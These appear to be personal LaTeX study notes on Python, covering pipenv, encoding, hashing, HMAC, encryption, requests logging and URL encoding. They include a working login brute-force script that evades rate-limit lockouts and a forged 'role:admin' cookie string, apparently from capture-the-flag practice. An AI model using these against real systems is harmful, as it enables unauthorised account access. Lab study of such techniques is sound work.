\chapter{Python}

\section{venv}
\url{https://www.youtube.com/watch?v=CHpQF1rdUMY}
\url{https://www.youtube.com/watch?v=KxvKCSwlUv8}
\url{https://towardsdatascience.com/python-environment-101-1d68bda3094d}
\url{https://www.dataquest.io/blog/a-complete-guide-to-python-virtual-environments/}


\subsection{pipenv}

 workflow:
\begin{verbatim}
cd myproject
pipenv install [--python VERSION]
pipenv install <package>
pipenv update --outdate

pipenv shell
pip list
exit pour sortir du pipenv shell
pipenv run XXX
pipenv graph
pipenv --rm
pipenv install ou pipenv sync
pipenv uninstall autopep8
pipenv clean
\end{verbatim}
 
 
\verb+ pipenv --venv+ : provide where venv is stores
(\verb+~/.local/share/virtualenvs/???+)
 
 \verb+pipenv --rm+  from the venv shell or simply delete the folder from \verb+pipenv --venv+

\section{Compression, encoding }

\subsection{zlib}
see also \verb+shutils+
\begin{verbatim}
import zlib
import base64
t=b'789c2b2d4e2db2ca28492a05d2d645f939a956c525a529a97925d62599b9a95686666686c6a666962616004e220e5a'
encodedStr = 'eJwrLU4tssooSSoF0tZF+TmpVsUlpSmpeSXWJZm5qVaGZmaGJiamRqYGAE4EDks='
print(zlib.decompress(base64.b64decode(encodedStr)))

str=b'user:htbuser;role:admin;time:1661445250'
print(base64.b64encode(zlib.compress(str)))
\end{verbatim}

\subsection{base64}
\subsection{md5}
\begin{verbatim}
import hashlib

str2hash = "md5.me"

result = hashlib.md5(str2hash.encode())
print(result.hexdigest())
\end{verbatim}


\subsection{hmac}

\begin{verbatim}
import hmac
import hashlib

hmac_calculated = hmac.new(config.SECRET_KEY.encode(), pickled, hashlib.sha512).digest()
cookie = base64.b64encode(pickled) + b'.' + base64.b64encode(hmac_calculated)

pickled_b64, hmac_given_b64 = cookie.split(".")
pickled = base64.b64decode(pickled_b64)
hmac_given = base64.b64decode(hmac_given_b64)

# Calculate the expected HMAC value and check if it matches
hmac_expected = hmac.new(config.SECRET_KEY.encode(), pickled, hashlib.sha512).digest()
if hmac_expected != hmac_given:
    return None
\end{verbatim}

\subsection{AES}
\begin{verbatim}
from cryptography.fernet import Fernet
import base64
import hashlib


class encryptAES:
    def __init__(self, data):
        self.data = data
        self.key = base64.b64encode(hashlib.sha256(
            app.config['SECRET_KEY'].encode()).digest()[:32])
        self.f = Fernet(self.key)

    def encrypt(self):
        encrypted = self.f.encrypt(self.data)
        return base64.b64encode(encrypted).decode()

    def decrypt(self):
        encrypted = base64.b64decode(self.data)
        return self.f.decrypt(encrypted)
\end{verbatim}

\section{Requests}


\url{https://requests.readthedocs.io/en/latest/}
\subsection{logging}
\subsubsection{Solution 1}
\begin{verbatim}
import requests
import http
import logging

# Set up logging to a file
logging.basicConfig(filename="app.log", level=logging.DEBUG)
logger = logging.getLogger(__name__)
http.client.HTTPConnection.debuglevel = 1

# Monkey patch the print() function and redirect it to a logger.debug() call
def print_to_log(*args):
    logger.debug(" ".join(args))
http.client.print = print_to_log

# Test HTTP GET and POST
url = "http://localhost:5000/test"

logger.info("Sending HTTP GET")
resp = requests.get(url)

logger.info("Sending HTTP POST")
resp = requests.post(url, data='My Test Data')
\end{verbatim}

\subsubsection{solution 2} 
\begin{verbatim}
\import logging
import contextlib
try:
    from http.client import HTTPConnection # py3
except ImportError:
    from httplib import HTTPConnection # py2

def debug_requests_on():
    '''Switches on logging of the requests module.'''
    HTTPConnection.debuglevel = 1

    logging.basicConfig()
    logging.getLogger().setLevel(logging.DEBUG)
    requests_log = logging.getLogger("requests.packages.urllib3")
    requests_log.setLevel(logging.DEBUG)
    requests_log.propagate = True

def debug_requests_off():
    '''Switches off logging of the requests module, might be some side-effects'''
    HTTPConnection.debuglevel = 0

    root_logger = logging.getLogger()
    root_logger.setLevel(logging.WARNING)
    root_logger.handlers = []
    requests_log = logging.getLogger("requests.packages.urllib3")
    requests_log.setLevel(logging.WARNING)
    requests_log.propagate = False

@contextlib.contextmanager
def debug_requests():
    '''Use with 'with'!'''
    debug_requests_on()
    yield
    debug_requests_off()
\end{verbatim}

call:
\begin{verbatim}
>>> requests.get('http://httpbin.org/')
<Response [200]>

>>> debug_requests_on()
>>> requests.get('http://httpbin.org/')
INFO:requests.packages.urllib3.connectionpool:Starting new HTTP connection (1): httpbin.org
DEBUG:requests.packages.urllib3.connectionpool:"GET / HTTP/1.1" 200 12150
send: 'GET / HTTP/1.1\r\nHost: httpbin.org\r\nConnection: keep-alive\r\nAccept-
Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.11.1\r\n\r\n'
reply: 'HTTP/1.1 200 OK\r\n'
header: Server: nginx
...
<Response [200]>

>>> debug_requests_off()
>>> requests.get('http://httpbin.org/')
<Response [200]>

>>> with debug_requests():
...     requests.get('http://httpbin.org/')
INFO:requests.packages.urllib3.connectionpool:Starting new HTTP connection (1): httpbin.org
...
<Response [200]>
\end{verbatim}


\subsection{example}
\begin{verbatim}
import requests
import time
url = "http://{}/login.php".format(ip)
# rate limit blocks for 30 seconds
lock_time = 30
# message that alert us we hit rate limit
lock_message = "Too many login failure"
# read user and password
for username in ["support.cn", "support.gr", "support.it",  "support.us"]:
    with open(userpass_file, "r") as fh:
        for fline in fh:
            if fline.startswith("#"):
                continue
            password = fline.rstrip()
            data = {
                "userid": username,
                "passwd": password,
                "submit": "submit"
            }
    
            #print(" test {} ".format(password))
            # do the request
            res = requests.post(url, headers=headers, data=data)
            #print(res.text)
    
            # handle generic credential error
            if "Invalid credentials" in res.text:
                print("[-] Invalid credentials: userid:{} passwd:{}".format(user
name, password))
            elif lock_message in res.text:
                print("[-] Hit rate limit, sleeping 30")
                # do the actual sleep plus 0.5 to be sure
                time.sleep(lock_time+0.5)
            else:
                print("[+++++++++++] Valid credentials: userid:{} passwd:{}".for
mat(username, password))
                exit()

\end{verbatim}

\section{URL Encoding query strings or form parameters}
\url{https://www.urlencoder.io/python/}

\begin{verbatim}
>>> import urllib.parse
>>> query = 'Hellö Wörld@Python'
>>> urllib.parse.quote(query)
'Hell%C3%B6%20W%C3%B6rld%40Python'


urllib.parse.quote('/', safe='')
'%2F'

# encode + - 
>>> import urllib.parse
>>> query = 'Hellö Wörld@Python'
>>> urllib.parse.quote_plus(query)
'Hell%C3%B6+W%C3%B6rld%40Python'


>>> import urllib.parse
>>> params = {'q': 'Python URL encoding', 'as_sitesearch': 'www.urlencoder.io'}
>>> urllib.parse.urlencode(params)
'q=Python+URL+encoding&as_sitesearch=www.urlencoder.io'

# If you want the urlencode() function to use the quote() function for encoding parameters
urllib.parse.urlencode(params, quote_via=urllib.parse.quote)


>>> import urllib.parse
>>> params = {'name': 'Rajeev Singh', 'phone': ['+919999999999', '+628888888888']}
>>> urllib.parse.urlencode(params, doseq=True)
'name=Rajeev+Singh&phone=%2B919999999999&phone=%2B628888888888'



\end{verbatim}




